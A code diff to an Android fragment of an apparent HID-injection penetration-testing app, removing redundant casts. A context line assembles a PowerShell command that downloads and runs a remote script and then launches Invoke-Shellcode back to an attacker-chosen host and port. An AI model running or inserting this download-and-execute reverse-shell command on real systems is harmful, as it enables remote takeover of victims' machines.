@@ -327,7 +327,7 @@ public class HidFragment extends Fragment {
         public View onCreateView(LayoutInflater inflater, ViewGroup container,
                                  Bundle savedInstanceState) {
             View rootView = inflater.inflate(R.layout.hid_powersploit, container, false);
-            Button b = (Button) rootView.findViewById(R.id.powersploitOptionsUpdate);
+            Button b = rootView.findViewById(R.id.powersploitOptionsUpdate);
             b.setOnClickListener(this);
             loadOptions(rootView);
             return rootView;
@@ -340,13 +340,13 @@ public class HidFragment extends Fragment {
                         return;
                     }
                     ShellExecuter exe = new ShellExecuter();
-                    EditText ip = (EditText) getView().findViewById(R.id.ipaddress);
-                    EditText port = (EditText) getView().findViewById(R.id.port);
+                    EditText ip =  getView().findViewById(R.id.ipaddress);
+                    EditText port = getView().findViewById(R.id.port);
 
-                    Spinner payload = (Spinner) getView().findViewById(R.id.payload);
+                    Spinner payload = getView().findViewById(R.id.payload);
                     String payloadValue = payload.getSelectedItem().toString();
 
-                    EditText newPayloadUrl = (EditText) getView().getRootView().findViewById(R.id.payloadUrl);
+                    EditText newPayloadUrl = getView().getRootView().findViewById(R.id.payloadUrl);
                     String newString = "Invoke-Shellcode -Payload " + payloadValue + " -Lhost " + ip.getText() + " -Lport " + port.getText() + " -Force";
                     String newText = "iex (New-Object Net.WebClient).DownloadString(\"" + newPayloadUrl.getText() + "\"); " + newString;
 
@@ -362,9 +362,9 @@ public class HidFragment extends Fragment {
         }
 
         private void loadOptions(final View rootView) {
-            final EditText payloadUrl = (EditText) rootView.findViewById(R.id.payloadUrl);
-            final EditText port = (EditText) rootView.findViewById(R.id.port);
-            final Spinner payload = (Spinner) rootView.findViewById(R.id.payload);
+            final EditText payloadUrl = rootView.findViewById(R.id.payloadUrl);
+            final EditText port = rootView.findViewById(R.id.port);
+            final Spinner payload = rootView.findViewById(R.id.payload);
             final ShellExecuter exe = new ShellExecuter();
 
             new Thread(new Runnable() {
